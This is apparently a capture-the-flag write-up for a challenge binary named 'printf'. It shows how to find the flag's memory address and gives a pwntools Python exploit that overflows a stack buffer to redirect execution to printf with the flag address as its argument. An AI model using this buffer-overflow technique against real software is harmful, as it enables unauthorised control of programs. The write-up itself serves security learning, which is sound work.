# printf

Running the binary for this challenge informs us that the flag was loaded at **0x804c040**.

![Inline](../images/pf_1.png?raw=true)


Looking at the source code, we can see there is a **printf** function in the **main**. We can use that function to print our flag by printing the value of **key** variable.

![Inline](../images/pf_2.png?raw=true)


To do that we disassamble the main function and get the binary address of **printf**. That is **0x0804938c**.

![Inline](../images/pf_3.png?raw=true)


Now we can send the **printf** followed by the **key** which the function will take as an argument.

## Exploit
Final exploit is:
```python 
from pwn import *
target = './printf'
e = context.binary = ELF(target,checksec=True)
context.log_level='debug'
io = process(target)
io.recvline()

printf = 0x0804938c 
key = 0x804c040
#ret = 0x080493ac
#pr_f = e.symbols['got.printf']

buf2ebp = 0x10

payload = ''
payload = cyclic(buf2ebp+4)
payload += p32(printf) 
payload += p32(key)

io.sendline(payload)

io.recvline()
io.recvline()
io.recvline()

io.close()
```